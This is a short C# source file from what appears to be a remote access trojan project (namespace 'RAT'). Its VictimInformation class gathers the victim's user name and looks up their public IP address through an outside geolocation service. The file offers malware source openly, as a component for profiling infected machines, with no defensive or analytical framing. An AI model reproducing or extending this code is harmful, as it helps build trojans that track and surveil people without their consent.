using System;
using System.Net;
using System.Net.Http;
using RAT.APIs;

namespace RAT;

public class VictimInformation
{
    public static VictimInformation Shared = new();
    public IPAddress ip { get; private set; }
    public string UserName { get; } = Environment.UserName;
    public async Task<bool> RefreshIP()
    {
        try
        {
            Stream qJson = await SingleInstance.HttpClient.GetStreamAsync("http://ip-api.com/json/"); // Quick API.
            IpJson victimData = (await System.Text.Json.JsonSerializer.DeserializeAsync<IpJson>(qJson))!;
            ip = IPAddress.Parse(victimData.Query!);
            return true;
        }
        catch
        {
            return false;
        }
    }
}